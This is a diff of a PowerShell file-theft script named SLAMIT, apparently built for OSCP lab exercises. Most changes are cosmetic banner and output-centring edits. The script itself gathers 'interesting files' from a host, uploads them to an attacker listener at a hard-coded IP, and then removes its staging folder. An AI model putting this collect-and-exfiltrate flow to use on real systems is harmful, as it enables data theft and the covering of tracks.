@@ -11,8 +11,8 @@
 # 
 # =============================================================================
 
-# $uri = "http://192.168.45.163:80";
-$uri = "http://10.10.202.153:80" # set up a ligolo listener first!
+$uri = "http://192.168.45.163:80";
+# $uri = "http://10.10.202.153:80" # set up a ligolo listener first!
 $baseDir = "/home/kali/projects/oscp";
 $mainDir = "challenges";
 $proj = "oscp_c";
@@ -27,16 +27,23 @@ $thisDir = Get-Location
 function Write-SectionHeader {
     param([string]$Title)
     
-    $width = 90
+    $width = 100
     $borderChar = "#"
     $paddingChar = " "
     
+    # Calculate hammer-centered positioning for the box
+    # The hammer's center point is approximately at the visual center of the hammer
+    # Looking at the hammer lines, the visual center is around position 60-65
+    $hammerCenter = 62
+    $leftMargin = [math]::Max(0, $hammerCenter - [math]::Floor($width / 2))
+    $leftPadding = " " * $leftMargin
+    
     # Top border
-    Write-Host ($borderChar * $width) -ForegroundColor Cyan
+    Write-Host ($leftPadding + ($borderChar * $width)) -ForegroundColor Cyan
     
     # Empty line
     $emptyLine = $borderChar + ($paddingChar * ($width - 2)) + $borderChar
-    Write-Host $emptyLine -ForegroundColor Cyan
+    Write-Host ($leftPadding + $emptyLine) -ForegroundColor Cyan
     
     # Centered header
     $innerWidth = $width - 2
@@ -45,13 +52,13 @@ function Write-SectionHeader {
     $rightPad = $innerWidth - $textLen - $leftPad
     
     $headerLine = $borderChar + ($paddingChar * $leftPad) + $Title + ($paddingChar * $rightPad) + $borderChar
-    Write-Host $headerLine -ForegroundColor Cyan
+    Write-Host ($leftPadding + $headerLine) -ForegroundColor Cyan
     
     # Empty line
-    Write-Host $emptyLine -ForegroundColor Cyan
+    Write-Host ($leftPadding + $emptyLine) -ForegroundColor Cyan
     
     # Bottom border
-    Write-Host ($borderChar * $width) -ForegroundColor Cyan
+    Write-Host ($leftPadding + ($borderChar * $width)) -ForegroundColor Cyan
     Write-Host ""
 }
 
@@ -59,12 +66,19 @@ function Write-SectionHeader {
 function Write-CompletionMessage {
     param([string]$Message)
     
-    $width = 90
+    $width = 102
     $borderChar = "="
     $paddingChar = " "
     
+    # Calculate hammer-centered positioning for the box
+    # The hammer's center point is approximately at the visual center of the hammer
+    # Looking at the hammer lines, the visual center is around position 60-65
+    $hammerCenter = 62
+    $leftMargin = [math]::Max(0, $hammerCenter - [math]::Floor($width / 2))
+    $leftPadding = " " * $leftMargin
+    
     # Top border
-    Write-Host ($borderChar * $width) -ForegroundColor Green
+    Write-Host ($leftPadding + ($borderChar * $width)) -ForegroundColor Green
     
     # Centered message
     $innerWidth = $width - 2
@@ -73,26 +87,38 @@ function Write-CompletionMessage {
     $rightPad = $innerWidth - $textLen - $leftPad
     
     $messageLine = $borderChar + ($paddingChar * $leftPad) + $Message + ($paddingChar * $rightPad) + $borderChar
-    Write-Host $messageLine -ForegroundColor Green
+    Write-Host ($leftPadding + $messageLine) -ForegroundColor Green
     
     # Bottom border
-    Write-Host ($borderChar * $width) -ForegroundColor Green
+    Write-Host ($leftPadding + ($borderChar * $width)) -ForegroundColor Green
     Write-Host ""
+}
+
+# Function to center regular text output
+function Write-CenteredText {
+    param([string]$Text, [string]$Color = "White")
+    
+    # Calculate hammer-centered positioning
+    # The hammer's center point is approximately at the visual center of the hammer
+    # Looking at the hammer lines, the visual center is around position 60-65
+    $hammerCenter = 62
+    $leftMargin = [math]::Max(0, $hammerCenter - [math]::Floor($Text.Length / 2))
+    $leftPadding = " " * $leftMargin
+    
+    Write-Host ($leftPadding + $Text) -ForegroundColor $Color
 }
 
 # Create a perfectly aligned SLAMIT banner
 Write-Host ""
-Write-Host " .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. " -ForegroundColor Cyan
-Write-Host "| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |" -ForegroundColor Cyan
-Write-Host "| |    _______   | || |   _____      | || |      __      | || | ____    ____ | || |     _____    | || |  _________   | |" -ForegroundColor Cyan
-Write-Host "| |   /  ___  |  | || |  |_   _|     | || |     /  \     | || ||_   \  /   _|| || |    |_   _|   | || | |  _   _  |  | |" -ForegroundColor Cyan
-Write-Host "| |  |  (__ \_|  | || |    | |       | || |    / /\ \    | || |  |   \/   |  | || |      | |     | || | |_/ | | \_|  | |" -ForegroundColor Cyan
-Write-Host "| |   '.___`-.   | || |    | |   _   | || |   / ____ \   | || |  | |\  /| |  | || |      | |     | || |     | |      | |" -ForegroundColor Cyan
-Write-Host "| |  |`\____) |  | || |   _| |__/ |  | || | _/ /    \ \_ | || | _| |_\/_| |_ | || |     _| |_    | || |    _| |_     | |" -ForegroundColor Cyan
-Write-Host "| |  |_______.'  | || |  |________|  | || ||____|  |____|| || ||_____||_____|| || |    |_____|   | || |   |_____|    | |" -ForegroundColor Cyan
-Write-Host "| |              | || |              | || |              | || |              | || |              | || |              | |" -ForegroundColor Cyan
-Write-Host "| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |" -ForegroundColor Cyan
-Write-Host " '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' " -ForegroundColor Cyan
+
+
+Write-Host "                                       _________.____       _____      _____  .______________" -ForegroundColor Cyan
+Write-Host "                                      /   _____/|    |     /  _  \    /     \ |   \__    ___/" -ForegroundColor Cyan
+Write-Host "                                      \_____  \ |    |    /  /_\  \  /  \ /  \|   | |    |   " -ForegroundColor Cyan
+Write-Host "                                      /        \|    |___/    |    \/    Y    \   | |    |   " -ForegroundColor Cyan
+Write-Host "                                     /_______  /|_______ \____|__  /\____|__  /___| |____|   " -ForegroundColor Cyan
+Write-Host "                                             \/         \/       \/         \/               " -ForegroundColor Cyan
+
 Write-Host ""
 Write-Host "            ...................................................................................................." -ForegroundColor DarkGray
 Write-Host "            ...................................................................................................." -ForegroundColor DarkGray
@@ -227,7 +253,7 @@ if (Test-Path $stagingDir) {
 }
 New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
 
-Write-Host "Created staging directory: $stagingDir" -ForegroundColor Yellow
+Write-CenteredText "Created staging directory: $stagingDir" "Yellow"
 
 # File extensions to include
 $extensions = @(
@@ -255,7 +281,7 @@ try {
     $allFiles = @()
     $stagedFiles = @()
 
-    Write-Host "Searching for interesting files..." -ForegroundColor Yellow
+    Write-CenteredText "Searching for interesting files..." "Yellow"
 
     # Search for interesting files
     foreach ($if in $interestingFiles) {
@@ -288,7 +314,7 @@ try {
         }
     }
 
-    Write-Host "Found $($allFiles.Count) interesting files" -ForegroundColor Green
+    Write-CenteredText "Found $($allFiles.Count) interesting files" "Green"
 
     # Stage files to the dedicated directory
     foreach ($file in $allFiles) {
@@ -316,17 +342,17 @@ try {
             # Copy file to staging directory
             Copy-Item -Path $file.FullName -Destination $targetPath -ErrorAction Stop
             $stagedFiles += $targetPath
-            Write-Host "Staged: $($file.Name) → $targetPath" -ForegroundColor Green
+            Write-CenteredText "Staged: $($file.Name) → $targetPath" "Green"
         }
         catch {
-            Write-Warning "Failed to stage: $($file.FullName) — $_"
+            Write-CenteredText "Failed to stage: $($file.FullName) — $_" "Yellow"
         }
     }
 
-    Write-Host "Successfully staged $($stagedFiles.Count) files to: $stagingDir" -ForegroundColor Green
+    Write-CenteredText "Successfully staged $($stagedFiles.Count) files to: $stagingDir" "Green"
 }
 catch {
-    Write-Warning "File discovery failed: $_"
+    Write-CenteredText "File discovery failed: $_" "Yellow"
 }
 
 Write-CompletionMessage "File Discovery and Collection Complete"
@@ -337,7 +363,7 @@ try
 {
     # Only upload files from the staging directory to prevent duplicates and tool contamination
     if (-not (Test-Path $stagingDir)) {
-        Write-Warning "Staging directory not found. No files to upload."
+        Write-CenteredText "Staging directory not found. No files to upload." "Yellow"
         return
     }
 
@@ -345,11 +371,11 @@ try
     $files = Get-ChildItem -Path $stagingDir -File -Recurse -ErrorAction SilentlyContinue
     
     if ($files.Count -eq 0) {
-        Write-Host "No files found in staging directory to upload." -ForegroundColor Yellow
+        Write-CenteredText "No files found in staging directory to upload." "Yellow"
         return
     }
 
-    Write-Host "Starting upload of $($files.Count) staged files..." -ForegroundColor Yellow
+    Write-CenteredText "Starting upload of $($files.Count) staged files..." "Yellow"
     
     $uploadCount = 0
     $successCount = 0
@@ -398,20 +424,17 @@ try
         }
     }
 
-    # Pretty print summary
+    # Simple centered upload summary
     Write-Host ""
-    Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-    Write-Host "║                              UPLOAD SUMMARY                                 ║" -ForegroundColor Cyan
-    Write-Host "╠══════════════════════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
-    Write-Host "║  Total Files Processed: $($uploadCount.ToString().PadLeft(8))                                                    ║" -ForegroundColor White
-    Write-Host "║  Successfully Uploaded: $($successCount.ToString().PadLeft(8))                                                    ║" -ForegroundColor Green
-    Write-Host "║  Failed Uploads:        $($failedCount.ToString().PadLeft(8))                                                    ║" -ForegroundColor Red
-    Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+    Write-CenteredText "Upload Summary:" "Cyan"
+    Write-CenteredText "  Total Files Processed: $uploadCount" "White"
+    Write-CenteredText "  Successfully Uploaded: $successCount" "Green"
+    Write-CenteredText "  Failed Uploads: $failedCount" "Red"
     Write-Host ""
 }
 catch
 {
-    Write-Error "Upload Files failed: Error: $_"
+    Write-CenteredText "Upload Files failed: Error: $_" "Red"
 }
 
 Write-CompletionMessage "File Upload Complete"
@@ -420,16 +443,16 @@ Write-CompletionMessage "File Upload Complete"
 try {
     if (Test-Path $stagingDir) {
         Remove-Item -Path $stagingDir -Recurse -Force
-        Write-Host "Cleaned up staging directory: $stagingDir" -ForegroundColor Green
+        Write-CenteredText "Cleaned up staging directory: $stagingDir" "Green"
     }
 }
 catch {
-    Write-Warning "Failed to cleanup staging directory: $_"
+    Write-CenteredText "Failed to cleanup staging directory: $_" "Yellow"
 }
 
 # Final completion message
 Write-Host ""
 Write-SectionHeader "SLAMIT COMPLETE"
-Write-Host "All operations completed successfully!" -ForegroundColor Green
-Write-Host "Files were staged, uploaded, and cleaned up automatically." -ForegroundColor Yellow
+Write-CenteredText "All operations completed successfully!" "Green"
+Write-CenteredText "Files were staged, uploaded, and cleaned up automatically." "Yellow"
 Write-Host ""
